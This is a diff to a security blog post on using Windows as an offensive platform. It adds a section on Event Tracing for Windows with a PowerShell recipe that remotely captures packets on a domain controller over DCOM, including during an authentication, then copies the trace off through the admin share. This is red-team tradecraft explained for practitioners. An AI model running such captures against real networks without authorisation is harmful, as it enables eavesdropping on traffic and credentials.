@@ -28,6 +28,7 @@ permalink: /living-off-the-foreign-land-windows-as-offensive-platform-part-3
 *[DCOM]: Distributed COM
 *[WinRM]: Windows Remote Management
 *[DCERPC]: Distributed Computing Environment RPC
+*[ETW]: Event Tracing for Windows
 
 
 # Introduction
@@ -370,6 +371,42 @@ Through the Server Manager (`ServerManager.exe`) it is possible to manage server
 
 ![Server Manager](/assets/img/20230815_living-off-the-foreign-land/ServerManager.png "Server Manager")
 
+### Event Tracing for Windows
+Event Tracing for Windows (ETW) is a logging mechanism where event providers can write events to an ETW session. Event consumers are able to listen for these events and process them.
+
+An example of an event provider is `Microsoft-Windows-NDIS-PacketCapture` which allows for capturing packets on a network interface. Such capture is also possible on a remote host without installing any tooling.
+
+```powershell
+# Initiate CIM session to DC1
+$so = New-CimSessionOption -Protocol Dcom
+$s = New-CimSession -ComputerName DC1.ad.bitsadmin.com -SessionOption $so
+
+# Initiate a ETW packet capture session
+New-NetEventSession -Name sess -CimSession $s -LocalFilePath "C:\Windows\Temp\Trace.etl" -CaptureMode SaveToFile
+Add-NetEventPacketCaptureProvider -SessionName sess -CimSession $s -Level 4 -CaptureType Physical -TruncationLength ([UInt16]::MaxValue)
+Start-NetEventSession -Name sess -CimSession $s
+Get-NetEventSession -Name sess -CimSession $s
+
+#
+# Have the packet capture provider run for a while to collect network traffic
+# In the video below during this time, an authentication takes place against the DC1 host
+#
+
+# Stop the packet capture and obtain the trace file
+Stop-NetEventSession -Name sess -CimSession $s
+Remove-NetEventSession -Name sess -CimSession $s
+Move-Item \\DC1.ad.bitsadmin.com\C$\Windows\Temp\Trace.etl C:\Tmp
+
+# Convert the ETW trace to pcap format and open it
+# etl2pcapng.exe is available at https://github.com/microsoft/etl2pcapng
+etl2pcapng.exe C:\Tmp\Trace.etl C:\Tmp\DC1_Trace.pcapng
+ii C:\Tmp\DC1_Trace.pcapng
+```
+<video width="740" height="430" controls poster="/assets/img/20230815_living-off-the-foreign-land/NetEventPacketCaptureProvider_poster.png">
+  <source src="/assets/img/20230815_living-off-the-foreign-land/NetEventPacketCaptureProvider.mp4" type="video/mp4">
+  Your browser does not support the video tag.
+</video>
+
 ### Attacker tools
 Even though attacker tools are not exactly LOFLCABs, depending on how they are developed they can be used from the Offensive Windows VM against the target environment. These can be .NET tools, Win32 applications or PowerShell scripts. As long as the tools underlying make use of the Windows libraries which transparently perform the authentication, they can be used to interact with Active Directory and other Windows systems. As always when using the Offensive Windows VM, with these tools the FQDN of the target domain or host needs to be used. When using tools that interact with the domain, often the domain and in some cases LDAP server name do need to be explicitly specified because they cannot be identified based on the context. An example of an attacker tool that works well is SharpHound[^7] where it is required to specify the `--Domain` parameter.
 
@@ -399,7 +436,7 @@ Regarding the network-level interaction with the Hyper-V server, port `5985/TCP`
 Remote Desktop Services (RDS) is a Windows Server role which allows users to access and interact with a remote computer or VM. RDS provides both functionality to provide users dedicated environments, or a shared desktop environment on a single server. Moreover, through its RemoteApp functionality, it can stream apps that are running on a server to a client. This functionality works seamlessly in a Windows client environment and through `mstsc.exe` these RemoteApps will show up on the desktop of the Offensive Windows VM.
 
 To manage the server part of RDS, the Server Manager (`ServerManager.exe`) can be used. In the Remote Desktop Services section of the Server Manager, the various aspects of RDS can be managed such as RD Web Access and RemoteApps that are published.
-
+`
 ### Certificate Services
 Active Directory Certificate Services (ADCS) is a server role which provides certificate-based authentication and encryption services for a network. The management of ADCS consists of two parts. The first part is the Certificate Templates MMC snap-in (`certtmpl.msc`). This snap-in needs to be executed from an Offensive DC, otherwise it will complain that it is not able to locate a DC and is also not able to connect to the target domain. On the Offensive DC, launch `certtmpl.msc`, ignore the warning message and right click root node -\> Connect to another writable domain controller -\> Change -\> `ad.bitsadmin.com` -\> OK. Now it is possible to create (duplicate), modify and delete certificate templates. Note that if a SOCKS tunnel is used that does not support UDP, for this snap-in the `cldaproxy.sh` script is required.
 
